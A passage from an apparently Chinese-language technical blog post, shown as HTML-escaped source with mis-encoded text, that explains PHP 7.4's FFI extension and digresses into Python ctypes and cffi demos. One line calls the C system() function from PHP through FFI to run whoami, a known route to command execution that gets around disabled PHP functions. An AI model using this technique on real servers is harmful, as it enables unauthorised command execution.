&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>æ–‡æ¡£ä¸­ç»™äº†ä¸€ä¸ªå°æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// call C printf()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æ¥è¿è¡Œå³å¯è¾“å‡ºHello world!ï¼›è¿™ä¸ªå‡½æ•°çš„åŸå‹æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹¦å†™çš„å½¢å¼ç›¸å½“çš„ç®€æ´ï¼Œåˆ›å»ºFFIå¯¹è±¡ï¼ˆå£°æ˜ï¼‰-&amp;gt;è°ƒç”¨cæ–¹æ³•ï¼›è¯•ç€ç›´æ¥æ‰§è¡Œä¸€ä¸ªwhoami&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‘ç°åœ¨æ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œsystemå‡½æ•°ï¼Œçœ‹ä¸‹&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">æºç &lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
&lt;p>è¿™ç§æƒ…å†µä¸‹lib=NULLï¼Œhandle=RTLD_DEFAULTï¼ˆè¿™ä¸ªæ³¨é‡ŠTODOå°±å¾ˆçµæ€§ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
&lt;p>éšåè°ƒç”¨&lt;code>DL_FETCH_SYMBOL&lt;/code>ï¼Œ&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">ä¹Ÿå°±æ˜¯&lt;/a>dlsysm&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
&lt;/blockquote>
&lt;p>å½“dlsymç¬¬ä¸€ä¸ªå‚æ•°ä¸ºRTLD_DEFAULTæ—¶ï¼Œä¼šæŒ‰ç…§é»˜è®¤å…±äº«åº“é¡ºåºæŸ¥æ‰¾systemçš„ä½ç½®ï¼Œæœç´¢èŒƒå›´è¿˜åŒ…æ‹¬äº†å¯æ‰§è¡Œç¨‹åºæå…¶ä¾èµ–ä¸­çš„å‡½æ•°è¡¨ï¼ˆå¦‚æœè®¾ç½®äº† RTLD_GLOBALè¿˜ä¼šæœç´¢åŠ¨æ€åŠ è½½åº“ä¸­çš„å‡½æ•°è¡¨ï¼‰ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥åœ¨å…¨å±€ç¬¦å·è¡¨é‡Œæ‰¾äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦æŒ‡å®šåŠ è½½åº“ï¼Œfopenè¿™ç±»å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·&lt;/p>
&lt;p>æ›´å¤šçš„æ —å­è¯·å‚è§&lt;a href="https://wiki.php.net/rfc/ffi">æ–‡æ¡£&lt;/a>å’Œ&lt;a href="https://www.laruence.com/2020/03/11/5475.html">è¿™ä¸€ç¯‡æ–‡ç« &lt;/a>ï¼Œå†™çš„éƒ½å¾ˆè¯¦ç»†&lt;/p>
&lt;h3 id="è·‘ä¸ªé¢˜ffi-in-python">è·‘ä¸ªé¢˜ï¼šFFI in Python&lt;/h3>
&lt;p>Pythonçš„ä¼˜ç‚¹å°±ä¸å¿…è¯´äº†ï¼Œç¼ºç‚¹æ˜¯å°è£…å¤ªå¥½äº†å¯¼è‡´è¿è¡Œé€Ÿåº¦ä¸Šä¸å»ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨Pythonä¸­ç”¨C/C++å‘¢ï¼Ÿ&lt;/p>
&lt;p>è‚¥è‚ ä¸é”™çš„æƒ³æ³•ï¼ä¸è¿‡è¦è§£å†³çš„æœ‰ä¸¤ä¸ªé—®é¢˜ï¼šMarshallingï¼ˆæ„Ÿè§‰ç¼–ç»„è¿™ä¸ªç¿»è¯‘å¾ˆå¥‡æ€ª ä½†æ˜¯è¿™ä¸ªè¡Œä¸ºå¯ä»¥ç±»æ¯”ä¸€ä¸‹serializeï¼‰ &amp;amp; Manageing Memoryï¼ˆå†…å­˜ç®¡ç†ï¼‰&lt;/p>
&lt;ul>
&lt;li>Pythonä¸­ä¸‡ç‰©çš†objectï¼Œè€ŒCä¸­æœ‰ä¸¥æ ¼çš„int floatç­‰ç­‰ç±»å‹&lt;/li>
&lt;li>Pythonæœ‰gcï¼Œè€ŒCä¸­éœ€è¦æ‰‹åŠ¨malloc&lt;/li>
&lt;/ul>
&lt;p>ä¸è¿‡ä¸æ€¥ï¼Œå·²ç»æœ‰åº“å°è£…å¥½äº†è¿™äº›åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ¥åº·åº·demo&lt;/p>
&lt;h4 id="ctypesåº“">ctypesåº“&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># load the lib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># define the return type&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python3 test.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆåŠŸè°ƒç”¨äº†cadd.soï¼Œè€Œæˆ‘ä»¬åœ¨pythonä¸­è¦åšçš„åªæœ‰åŠ è½½.so-&amp;gt;è®¾ç½®ç¬¦åˆCæ ‡å‡†çš„è¿”å›å€¼ç±»å‹-&amp;gt;è°ƒç”¨ï¼Œè‚¥è‚ çš„ç®€å•&lt;/p>
&lt;p>ä¸è¿‡æ ‡å‡†åº“ctypesæœ‰ä¸€äº›ç¼ºé™· å¹¶ä¸”ä¸èƒ½æ‹“å±•å¤§å‹é¡¹ç›®ï¼Œé‰´äºæ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨cffiåº“&lt;/p>
&lt;h4 id="cffiåº“">cffiåº“&lt;/h4>
&lt;p>è¿™é‡Œæ˜¯ä¸€ä¸ªhello worldçš„å°demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># å¯ä»¥å®šä¹‰å‡½æ•° ç»“æ„ä½“ å˜é‡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># åŠ è½½cå‘½åç©ºé—´&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># å³ char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªæ —å­é‡Œç›´æ¥åœ¨ä¸€ä¸ªpyæ–‡ä»¶ä¸­ç”¨cffiè°ƒç”¨åº“å‡½æ•°å°±ç»“æŸäº†ï¼Œè‚¥è‚ è‚¥è‚ çš„ç®€å•ï¼›æˆ–è€…ä¹Ÿå¯ä»¥å’Œctypesä¸€æ ·ï¼Œå•ç‹¬å†™ä¸€ä¸ªcå…ˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åè°ƒç”¨&lt;code>ffi.verify()&lt;/code>åœ¨Pythonä¸­åŠ è½½å’Œä½¿ç”¨ï¼Œä¸è¿‡è¿˜éœ€è¦é¢å¤–å£°æ˜å‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> void Tprint(void);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
